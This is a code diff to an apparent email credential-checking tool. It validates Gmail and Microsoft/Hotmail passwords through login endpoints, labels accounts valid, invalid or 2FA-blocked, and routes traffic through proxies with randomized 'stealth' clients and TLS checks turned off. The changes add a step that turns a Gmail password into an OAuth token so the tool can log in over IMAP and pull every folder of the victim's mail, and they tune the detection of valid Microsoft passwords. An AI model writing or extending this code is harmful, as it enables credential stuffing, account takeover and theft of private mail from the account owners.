@@ -275,7 +275,14 @@ export async function createProxiedSocket({ targetHost, targetPort = 993, proxy,
  * Direct Google Android ClientLogin Verifier
  * Authenticates standard Gmail passwords directly without requiring 16-character App Passwords.
  */
-async function verifyGmailCredentials(user, pass, timeout = 7000) {
+/**
+ * Requests a Gmail OAuth token via the Android client auth endpoint.
+ * On success returns { token }; on a classified failure returns { status, message };
+ * returns null when the outcome is unknown (timeout, network error, unexpected shape).
+ * The token works as XOAUTH2 on imap.gmail.com, which is what enables mailbox
+ * reading for accounts whose basic IMAP auth is rejected.
+ */
+async function requestGmailAuthToken(user, pass, timeout = 8000) {
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), timeout);
   try {
@@ -298,21 +305,33 @@ async function verifyGmailCredentials(user, pass, timeout = 7000) {
     clearTimeout(timer);
     const text = await res.text();
     if (text.includes('Auth=')) {
-      return { success: true, status: 'valid', message: 'Gmail Authentication Successful (Valid Session)' };
+      const tokenMatch = text.match(/Auth=([^\s]+)/);
+      if (tokenMatch) return { token: tokenMatch[1] };
     }
     if (text.includes('Error=NeedsBrowser') || text.includes('Url=') || text.includes('Challenge')) {
-      return { success: false, status: '2fa', message: 'Gmail Valid Password (2FA / Verification Challenge Required)' };
-    }
-    if (text.includes('Error=BadAuthentication')) {
-      return { success: false, status: 'invalid', message: 'Invalid Gmail Credentials' };
+      return { status: '2fa', message: 'Gmail Valid Password (2FA / Verification Challenge Required)' };
     }
     if (text.includes('CaptchaRequired')) {
-      return { success: false, status: '2fa', message: 'Gmail Captcha / Verification Required' };
+      return { status: '2fa', message: 'Gmail Captcha / Verification Required' };
+    }
+    if (text.includes('Error=BadAuthentication')) {
+      return { status: 'invalid', message: 'Invalid Gmail Credentials' };
     }
   } catch (err) {
     clearTimeout(timer);
     // Surface abort/timeout as null; network errors bubble up to caller
     if (err.name === 'AbortError') return null;
+  }
+  return null;
+}
+
+async function verifyGmailCredentials(user, pass, timeout = 7000) {
+  const result = await requestGmailAuthToken(user, pass, timeout);
+  if (result?.token) {
+    return { success: true, status: 'valid', message: 'Gmail Authentication Successful (Valid Session)' };
+  }
+  if (result?.status) {
+    return { success: false, status: result.status, message: result.message };
   }
   return null;
 }
@@ -372,16 +391,28 @@ async function verifyMicrosoftCredentials(email, password, timeout = 8000) {
     const postSetCookie = postRes.headers.get('set-cookie') || '';
     const postBody = await postRes.text();
 
+    // Error page takes priority: a re-rendered login form means the password
+    // was rejected. Check this BEFORE the 2FA/valid branches — the login page
+    // template always contains PROOF/challenge markup, so checking those first
+    // misclassified wrong passwords as "valid password, 2FA required".
+    if (
+      postBody.includes('sErrTxt') ||
+      postBody.includes('Bad user credential') ||
+      postBody.includes('password is incorrect') ||
+      postBody.includes("account doesn't exist") ||
+      postBody.includes('80046709')
+    ) {
+      return { success: false, status: 'invalid', message: 'Invalid Microsoft Credentials' };
+    }
+
     if (status === 302 || location.includes('account.live.com') || location.includes('outlook.live.com') || postSetCookie.includes('RPSTAuth') || postSetCookie.includes('WLSSC')) {
       return { success: true, status: 'valid', message: 'Microsoft / Hotmail Authenticated Successfully' };
     }
 
-    if (location.includes('identity/challenge') || location.includes('proofs') || postBody.includes('PROOF.Type') || postBody.includes('Two-step verification')) {
+    // 2FA only when the flow actually redirects into a challenge — never from
+    // markup that is present on every response page.
+    if (location.includes('identity/challenge') || location.includes('proofs') || postBody.includes('Two-step verification')) {
       return { success: false, status: '2fa', message: 'Microsoft Valid Password (2FA / Security Verification Required)' };
-    }
-
-    if (postBody.includes('sErrTxt') || postBody.includes('80046709') || postBody.includes('password is incorrect') || postBody.includes('account doesn\'t exist')) {
-      return { success: false, status: 'invalid', message: 'Invalid Microsoft Credentials' };
     }
   } catch {}
   return null;
@@ -629,11 +660,23 @@ export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPer
       }
 
       const stealth = getRandomStealthClient();
+
+      // Gmail consumer IMAP rejects basic auth for most accounts; request an
+      // OAuth token from the same endpoint the checker uses and authenticate
+      // via XOAUTH2 instead. Falls back to basic auth (works for app passwords).
+      const lowerUser = (user || '').toLowerCase();
+      const isGmail = host === 'imap.gmail.com' || lowerUser.endsWith('@gmail.com') || lowerUser.endsWith('@googlemail.com');
+      let gmailToken = null;
+      if (isGmail) {
+        const tokenResult = await requestGmailAuthToken(user, pass, Math.min(Number(timeout) || 45000, 12000));
+        gmailToken = tokenResult?.token || null;
+      }
+
       const flowConfig = {
         host,
         port: Number(port) || 993,
         secure: true,
-        auth: { user, pass },
+        auth: gmailToken ? { user, accessToken: gmailToken } : { user, pass },
         logger: false,
         tls: {
           rejectUnauthorized: false,
@@ -791,9 +834,17 @@ export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPer
           mails: allMails.reverse()
         });
       })().catch((err) => {
+        let errorMsg = err.message || 'IMAP connection failed';
+        if (isGmail) {
+          errorMsg = gmailToken
+            ? `Gmail IMAP login failed (OAuth): ${errorMsg}`
+            : `Gmail IMAP login failed: ${errorMsg} (no OAuth token obtained — account may require 2FA or an app password)`;
+        } else if ((host.includes('office365') || host.includes('outlook')) && /login is disabled/i.test(errorMsg)) {
+          errorMsg = 'Microsoft has disabled basic-auth IMAP for this account. The password can still be verified via web login, but mailbox reading is not available without OAuth.';
+        }
         finalize({
           success: false,
-          error: err.message,
+          error: errorMsg,
           folders: foldersSummary,
           mails: []
         });
